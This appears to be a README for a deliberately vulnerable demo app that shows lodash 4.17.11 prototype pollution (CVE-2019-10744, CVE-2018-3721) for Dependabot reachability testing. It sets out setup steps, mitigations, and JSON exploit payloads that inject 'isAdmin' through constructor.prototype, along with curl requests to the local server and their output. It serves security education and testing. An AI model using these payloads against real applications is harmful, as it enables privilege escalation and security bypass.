# Dependabot Reachability Analysis - Vulnerable Lodash Demo

This repository demonstrates prototype pollution vulnerabilities in lodash 4.17.11, specifically:

- **CVE-2019-10744** (GHSA-jf85-cpcp-j695): Prototype pollution via `defaultsDeep`
- **CVE-2018-3721** (GHSA-fvqr-27wr-82fm): Prototype pollution via `merge` and `mergeWith`

## 🚨 Security Warning

This application intentionally contains security vulnerabilities for educational and testing purposes. **DO NOT USE IN PRODUCTION ENVIRONMENTS**.

## Vulnerability Overview

### CVE-2019-10744 
- **Affected Function**: `_.defaultsDeep()`
- **Affected Versions**: lodash < 4.17.12
- **Impact**: Prototype pollution leading to potential property injection
- **CVSS Score**: 9.1 (Critical)

### CVE-2018-3721
- **Affected Functions**: `_.merge()`, `_.mergeWith()`  
- **Affected Versions**: lodash < 4.17.11
- **Impact**: Prototype pollution leading to potential property injection
- **CVSS Score**: 6.1 (Medium)

## Setup and Installation

```bash
# Clone the repository
git clone https://github.com/octofelickz/dependabot-reachability-analysis.git
cd dependabot-reachability-analysis

# Install dependencies (including vulnerable lodash 4.17.11)
npm install

# Run the demonstration script
node demo.js

# Start the web application
npm start
```

## Demo Application

The web application runs on `http://localhost:3000` and provides:

1. **Interactive Web Interface**: Test vulnerabilities through a user-friendly form
2. **API Endpoints**: Direct API access for automated testing
3. **Real-time Status**: Check current prototype pollution state
4. **Reset Functionality**: Clean up prototype pollution between tests

### API Endpoints

- `GET /api/status` - Check current prototype pollution status
- `POST /api/defaults-deep` - Test CVE-2019-10744 via defaultsDeep
- `POST /api/merge` - Test CVE-2018-3721 via merge  
- `POST /api/merge-with` - Test CVE-2018-3721 via mergeWith
- `POST /api/reset` - Reset prototype pollution

### Example Exploit Payloads

**CVE-2019-10744 (defaultsDeep):**
```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

**CVE-2018-3721 (merge/mergeWith):**
```json
{
  "constructor": {
    "prototype": {
      "polluted": "value"
    }
  }
}
```

## Demonstration Results

### Command Line Demo Output

```
🚨 Lodash Vulnerability Demonstration
=====================================
Lodash version: 4.17.11

1. Testing CVE-2019-10744 (defaultsDeep):
Payload: {"constructor": {"prototype": {"isAdmin": true}}}
✅ Prototype successfully polluted via defaultsDeep!

2. Testing CVE-2018-3721 (merge):
❌ merge pollution failed (fixed in 4.17.11)

3. Testing CVE-2018-3721 (mergeWith):
❌ mergeWith pollution failed (fixed in 4.17.11)
```

### API Test Results

**Status Check (before exploitation):**
```bash
curl http://localhost:3000/api/status
{"prototypePolluded":false,"lodashVersion":"4.17.11"}
```

**Exploit via defaultsDeep:**
```bash
curl -X POST http://localhost:3000/api/defaults-deep \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

{"success":true,"message":"defaultsDeep executed","result":{},"testObject":{},"prototypePolluded":true,"isAdmin":true}
```

**Status Check (after exploitation):**
```bash
curl http://localhost:3000/api/status
{"prototypePolluted":true,"isAdmin":true,"lodashVersion":"4.17.11"}
```

## Security Analysis

### Impact of Prototype Pollution

Prototype pollution can lead to:
- **Property Injection**: Attackers can add properties to all objects
- **Security Bypass**: `isAdmin`, `isAuthenticated` properties can be injected
- **Denial of Service**: Overwriting critical prototype methods
- **Code Execution**: In some scenarios, can lead to RCE

### Version Analysis

Our testing shows:
- **lodash 4.17.11**: Vulnerable to CVE-2019-10744 (`defaultsDeep`)
- **CVE-2018-3721**: Appears to be fixed in 4.17.11 (affects earlier versions)

### Mitigation

1. **Upgrade lodash**: Use version 4.17.21 or later
2. **Input Validation**: Sanitize user input before processing
3. **Object Freezing**: Use `Object.freeze()` on prototypes
4. **Safe Parsing**: Avoid `JSON.parse()` with untrusted data
5. **CSP Headers**: Implement Content Security Policy

## Testing with Playwright

```bash
# Install test dependencies
npm install

# Run automated tests (requires browser installation)
npm test

# Run tests in headed mode
npm run test:headed
```

The Playwright tests demonstrate:
- Web UI interaction with vulnerable functions
- API endpoint exploitation
- Screenshot capture for documentation
- Automated verification of prototype pollution

## Repository Structure

```
├── server.js              # Express server with vulnerable endpoints
├── public/
│   └── index.html         # Web interface for testing
├── tests/
│   └── vulnerability.spec.js  # Playwright test suite
├── demo.js               # Command-line vulnerability demo
├── package.json          # Dependencies (including lodash 4.17.11)
├── package-lock.json     # Locked dependency versions
└── README.md            # This documentation
```

## Dependencies

- **lodash@4.17.11**: Vulnerable version for demonstration
- **express**: Web server framework
- **playwright**: End-to-end testing and screenshots

## Contributing

This is a security demonstration repository. If you find additional vulnerabilities or have improvements to the demonstration, please open an issue or pull request.

## License

This project is for educational purposes only. Use responsibly and only in authorized testing environments.